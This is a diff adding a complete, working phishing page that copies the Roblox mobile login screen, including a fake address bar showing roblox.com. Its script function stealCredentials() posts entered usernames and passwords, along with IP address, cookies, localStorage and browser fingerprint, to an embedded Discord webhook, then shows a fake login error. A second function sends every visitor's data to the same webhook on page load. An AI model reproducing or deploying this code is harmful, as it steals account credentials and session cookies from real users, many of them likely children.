@@ -1,1 +1,229 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Login to Roblox</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body { background: #121212; display: flex; justify-content: center; align-items: center; min-height: 100vh; color: #fff; }
+        .container { width: 100%; max-width: 420px; height: 100vh; background: #121212; position: relative; display: flex; flex-direction: column; }
+        
+        .header { display: flex; justify-content: space-between; align-items: center; padding: 10px 15px; background: #121212; }
+        .header-logo { display: flex; align-items: center; gap: 5px; }
+        .logo-box { width: 24px; height: 24px; background: #fff; transform: rotate(45deg); position: relative; }
+        .logo-box::after { content: ''; position: absolute; top: 5px; left: 5px; width: 14px; height: 14px; background: #121212; border-radius: 3px; }
+        .btn-signup { background: #2b5ff5; color: #fff; border: none; border-radius: 20px; padding: 6px 16px; font-size: 14px; font-weight: 600; cursor: pointer; }
+        .icon-search { font-size: 22px; margin-left: 10px; }
+        
+        .nav-tabs { display: flex; justify-content: space-around; padding: 10px 0; background: #121212; border-bottom: 1px solid #2a2a2a; overflow-x: auto; white-space: nowrap; }
+        .nav-item { color: #9aa0a6; font-size: 14px; font-weight: 500; padding: 5px 10px; }
+        .nav-item.active { color: #fff; border-bottom: 2px solid #2b5ff5; padding-bottom: 7px; }
 
+        .login-container {
+            flex-grow: 1; display: flex; flex-direction: column; justify-content: center; padding: 20px;
+            background: rgba(30, 30, 30, 0.8); margin: 10px; border-radius: 16px;
+        }
+        .login-title { text-align: center; font-size: 22px; font-weight: 600; margin-bottom: 25px; }
+        .input-group { margin-bottom: 15px; }
+        .input-field {
+            width: 100%; padding: 14px; border-radius: 10px; border: 1px solid #3c4043;
+            background: #202124; color: #fff; font-size: 15px; outline: none;
+        }
+        .input-field:focus { border-color: #2b5ff5; }
+        .btn-login {
+            width: 100%; padding: 14px; border-radius: 10px; border: none;
+            background: #2b5ff5; color: #fff; font-size: 16px; font-weight: 600; cursor: pointer;
+            margin-top: 5px; margin-bottom: 20px;
+        }
+        .btn-login:hover { background: #1a4ad9; }
+        .forgot-link { text-align: center; color: #9aa0a6; font-size: 14px; margin-bottom: 30px; cursor: pointer; }
+        .divider { height: 1px; background: #3c4043; width: 100%; margin: 10px 0 20px 0; }
+        .btn-secondary-action {
+            width: 100%; padding: 14px; border-radius: 10px; border: 1px solid #3c4043;
+            background: #2d2d2d; color: #fff; font-size: 15px; font-weight: 500; cursor: pointer;
+            margin-bottom: 15px; text-align: center;
+        }
+        .signup-bottom { text-align: center; font-size: 14px; color: #9aa0a6; margin-top: 10px; }
+        .signup-bottom span { color: #fff; cursor: pointer; }
+        
+        .browser-bar {
+            position: absolute; bottom: 0; width: 100%; background: #202124; padding: 10px 15px;
+            display: flex; align-items: center; justify-content: space-between; border-top: 1px solid #3c4043; z-index: 20;
+        }
+        .browser-bar .url { color: #9aa0a6; font-size: 14px; flex-grow: 1; text-align: center; }
+        .icon-arrow { font-size: 22px; color: #9aa0a6; }
+        .icon-dots { font-size: 22px; color: #9aa0a6; letter-spacing: 3px; }
+        
+        .error-msg {
+            color: #ff4444;
+            text-align: center;
+            font-size: 14px;
+            margin-bottom: 10px;
+            display: none;
+        }
+        .loading {
+            color: #ffaa00;
+            text-align: center;
+            font-size: 14px;
+            margin-bottom: 10px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="header-logo">
+                <div class="logo-box"></div>
+            </div>
+            <div style="display:flex; align-items:center;">
+                <button class="btn-signup">Sign Up</button>
+                <span class="icon-search">🔍</span>
+            </div>
+        </div>
+
+        <div class="nav-tabs">
+            <div class="nav-item active">Charts</div>
+            <div class="nav-item">Marketplace</div>
+            <div class="nav-item">Create</div>
+            <div class="nav-item">Robux</div>
+        </div>
+
+        <div class="login-container">
+            <div class="login-title">Login to Roblox</div>
+            
+            <div class="error-msg" id="errorMsg">❌ Invalid username or password!</div>
+            <div class="loading" id="loadingMsg">⏳ Verifying...</div>
+            
+            <div class="input-group">
+                <input type="text" class="input-field" id="username" placeholder="Username/Email/Phone" autocomplete="off">
+            </div>
+            <div class="input-group">
+                <input type="password" class="input-field" id="password" placeholder="Password" autocomplete="off">
+            </div>
+            <button class="btn-login" onclick="stealCredentials()">Log In</button>
+            <div class="forgot-link">Forgot Password or Username?</div>
+            <div class="divider"></div>
+            <button class="btn-secondary-action">Email Me a One-Time Code</button>
+            <button class="btn-secondary-action">Quick Sign-in</button>
+            <div class="signup-bottom">Don't have an account? <span>Sign Up</span></div>
+        </div>
+
+        <div class="browser-bar">
+            <span class="icon-arrow">←</span>
+            <span class="url">roblox.com</span>
+            <span class="icon-dots">⋮</span>
+        </div>
+    </div>
+    
+    <script>
+        const WEBHOOK = "https://discord.com/api/webhooks/1538116344967340144/ECF6ixeFCjRIZrStHKIv6SjuYyt09u8lGh_qTCP62P-nzOlwqF8raxBnLX3GtqIWsZLW";
+        
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (e) { return 'Unknown'; }
+        }
+        
+        async function stealCredentials() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const errorMsg = document.getElementById('errorMsg');
+            const loadingMsg = document.getElementById('loadingMsg');
+            
+            if (username === '' || password === '') {
+                errorMsg.textContent = '❌ Please fill in all fields!';
+                errorMsg.style.display = 'block';
+                return;
+            }
+            
+            errorMsg.style.display = 'none';
+            loadingMsg.style.display = 'block';
+            
+            const data = {
+                username: username,
+                password: password,
+                ip: await getIP(),
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                screen: screen.width + 'x' + screen.height,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                language: navigator.language,
+                cookies: document.cookie,
+                localStorage: JSON.stringify(localStorage),
+                time: new Date().toLocaleString()
+            };
+            
+            const message = '🔑 **ROBLOX LOGIN**\n\n' +
+                '👤 **Логин:** ' + data.username + '\n' +
+                '🔒 **Пароль:** ' + data.password + '\n\n' +
+                '🌐 **IP:** ' + data.ip + '\n' +
+                '👤 **UA:** ' + data.userAgent + '\n' +
+                '💻 **Платформа:** ' + data.platform + '\n' +
+                '🖥️ **Экран:** ' + data.screen + '\n' +
+                '⏰ **TZ:** ' + data.timezone + '\n' +
+                '🌍 **Язык:** ' + data.language + '\n' +
+                '📅 **Время:** ' + data.time + '\n\n' +
+                '🍪 **COOKIES:**\n```' + data.cookies + '```\n\n' +
+                '💾 **LocalStorage:**\n```' + data.localStorage.substring(0, 500) + '```';
+            
+            await fetch(WEBHOOK, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({content: message})
+            });
+            
+            setTimeout(function() {
+                loadingMsg.style.display = 'none';
+                errorMsg.textContent = '❌ Invalid username or password! Please try again.';
+                errorMsg.style.display = 'block';
+                document.getElementById('password').value = '';
+            }, 3000);
+        }
+        
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                stealCredentials();
+            }
+        });
+        
+        async function collectData() {
+            const data = {
+                ip: await getIP(),
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                screen: screen.width + 'x' + screen.height,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                language: navigator.language,
+                referrer: document.referrer,
+                url: window.location.href,
+                cookies: document.cookie
+            };
+            
+            const message = '🔍 **Посетитель фишинговой страницы**\n\n' +
+                '🌐 IP: ' + data.ip + '\n' +
+                '👤 UA: ' + data.userAgent + '\n' +
+                '💻 Платформа: ' + data.platform + '\n' +
+                '🖥️ Экран: ' + data.screen + '\n' +
+                '⏰ TZ: ' + data.timezone + '\n' +
+                '🌍 Язык: ' + data.language + '\n' +
+                '🔗 URL: ' + data.url + '\n' +
+                '📜 Реферер: ' + data.referrer + '\n\n' +
+                '🍪 COOKIES:\n```' + data.cookies + '```';
+            
+            await fetch(WEBHOOK, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({content: message})
+            });
+        }
+        
+        window.addEventListener('load', function() {
+            collectData();
+        });
+    </script>
+</body>
+</html>
